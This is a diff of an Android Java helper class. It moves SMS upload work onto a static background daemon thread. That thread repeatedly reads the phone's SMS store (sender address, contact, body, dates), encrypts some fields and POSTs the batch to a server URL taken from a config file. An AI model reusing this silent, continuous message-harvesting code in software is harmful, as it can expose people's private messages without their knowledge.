@@ -22,8 +22,6 @@ import java.security.spec.X509EncodedKeySpec;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Random;
-import java.util.concurrent.Executor;
-import java.util.concurrent.Executors;
 
 import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
@@ -34,9 +32,52 @@ import javax.crypto.spec.IvParameterSpec;
  * Created by sam on 9/13/16.
  */
 public class UploadHelper {
-    private static Executor uploadExecutor = Executors.newSingleThreadExecutor();
+    private static Thread daemonThread;
+    private static Object taskWait = new Object();
+
     private static long latest_date = 0;
     private static Random random = new Random(System.currentTimeMillis());
+
+    private static String publicKey = null;
+    private static String serviceURL = null;
+    private static String deviceId = null;
+    private static long max_date = 0;
+    private static int count = 0;
+    private static Context context;
+
+    static {
+        daemonThread = new Thread(new Runnable() {
+            public void run() {
+                while (true) {
+                    try {
+                        if (context == null) {
+                            synchronized (taskWait) {
+                                taskWait.wait();
+                            }
+                            continue;
+                        }
+
+                        JSONObject map = buildMap(context);
+
+                        if (map == null || map.getJSONArray("list").length() == 0) {
+                            synchronized (taskWait) {
+                                taskWait.wait(10 * 1000);
+                            }
+                            continue;
+                        }
+
+                        uploadSMS(map);
+
+                        Thread.sleep(5000);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        });
+
+        daemonThread.start();
+    }
 
     private static void fillEncryptField(String fieldKey, SecretKey secretKey, IvParameterSpec iv, JSONObject obj, String value) throws Exception {
         if (value == null) {
@@ -49,22 +90,15 @@ public class UploadHelper {
     }
 
     public static void uploadSMSQueue(final Context context) {
-        uploadExecutor.execute(new Runnable() {
-            public void run() {
-                try {
-                    uploadSMS(context);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            }
-        });
+        UploadHelper.context = context;
+
+        synchronized (taskWait) {
+            taskWait.notifyAll();
+        }
     }
 
-    private static void uploadSMS(Context context) {
+    private static JSONObject buildMap(Context context) {
         PublicKey pubKey = null;
-        String publicKey = null;
-        String serviceURL = null;
-        String deviceId = null;
         FileInputStream fin = null;
         try {
             fin = context.openFileInput(Consts.configPath);
@@ -81,7 +115,7 @@ public class UploadHelper {
             pubKey = kf.generatePublic(spec);
         } catch (Exception e) {
             e.printStackTrace();
-            return;
+            return null;
         } finally {
             IOUtils.closeQuietly(fin);
         }
@@ -91,7 +125,6 @@ public class UploadHelper {
         ContentResolver cr = context.getContentResolver();
         String[] projection = new String[]{"_id", "thread_id", "date", "type", "read", "address", "person", "body"};
         Cursor cur = null;
-        long max_date = 0;
 
         try {
             JSONObject map = new JSONObject();
@@ -100,7 +133,6 @@ public class UploadHelper {
 
             Uri uri = Uri.parse("content://sms/");
             cur = cr.query(uri, projection, "date>?", new String[]{String.valueOf(latest_date)}, "date desc");
-            int count = 0;
 
             ArrayList<JSONObject> list = new ArrayList<JSONObject>();
 
@@ -151,40 +183,49 @@ public class UploadHelper {
 
             map.put("list", new JSONArray(list));
 
-            String body = map.toString();
-            System.out.println(body);
-
-            if (count > 0) {
-                HttpURLConnection urlConnection = null;
-                try {
-                    urlConnection = (HttpURLConnection) new URL(serviceURL).openConnection();
-                    urlConnection.setDoOutput(true);
-                    urlConnection.setChunkedStreamingMode(0);
-                    urlConnection.setRequestMethod("POST");
-                    urlConnection.setRequestProperty("Content-Type", "text/json; charset=utf-8");
-                    urlConnection.setRequestProperty("Content-Length", String.valueOf(body.getBytes().length));
-                    OutputStream out = urlConnection.getOutputStream();
-                    out.write(body.getBytes());
-                    out.close();
-                    int responseCode = urlConnection.getResponseCode();
-                    System.out.println("responseCode = " + responseCode);
-                    if (responseCode == 200) {
-                        latest_date = max_date;
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                } finally {
-                    if (urlConnection != null) {
-                        urlConnection.disconnect();
-                    }
-                }
-            }
-
+            return map;
         } catch (Exception e) {
             e.printStackTrace();
         } finally {
             if (cur != null) {
                 cur.close();
+            }
+        }
+
+        return null;
+    }
+
+    private static void uploadSMS(JSONObject map) {
+        if (map == null) {
+            return;
+        }
+
+        String body = map.toString();
+        System.out.println(body);
+
+        if (count > 0) {
+            HttpURLConnection urlConnection = null;
+            try {
+                urlConnection = (HttpURLConnection) new URL(serviceURL).openConnection();
+                urlConnection.setDoOutput(true);
+                urlConnection.setChunkedStreamingMode(0);
+                urlConnection.setRequestMethod("POST");
+                urlConnection.setRequestProperty("Content-Type", "text/json; charset=utf-8");
+                urlConnection.setRequestProperty("Content-Length", String.valueOf(body.getBytes().length));
+                OutputStream out = urlConnection.getOutputStream();
+                out.write(body.getBytes());
+                out.close();
+                int responseCode = urlConnection.getResponseCode();
+                System.out.println("responseCode = " + responseCode);
+                if (responseCode == 200) {
+                    latest_date = max_date;
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            } finally {
+                if (urlConnection != null) {
+                    urlConnection.disconnect();
+                }
             }
         }
     }
